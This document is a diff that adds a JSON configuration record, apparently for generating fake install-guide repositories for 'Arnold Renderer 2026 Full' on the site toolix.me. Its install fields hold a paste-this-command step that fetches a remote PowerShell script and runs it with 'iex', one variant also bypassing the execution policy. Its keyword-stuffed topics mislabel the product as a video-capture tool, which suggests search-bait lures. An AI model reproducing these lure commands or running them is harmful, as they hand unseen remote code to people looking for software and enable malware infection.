@@ -1,0 +1,30 @@
+{
+  "repo": "Arnold-Renderer-2026-Full",
+  "product": "Arnold Renderer 2026 Full",
+  "product_title": "Arnold Renderer 2026",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-arnold-renderer",
+    "arnold-renderer-app",
+    "screen-capture",
+    "directx-capture",
+    "video-export",
+    "media-capture",
+    "creator-workflow",
+    "windows-recording",
+    "arnold-renderer-video-tool",
+    "arnold-renderer-editing-workflow",
+    "arnold-renderer",
+    "arnold-renderer-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
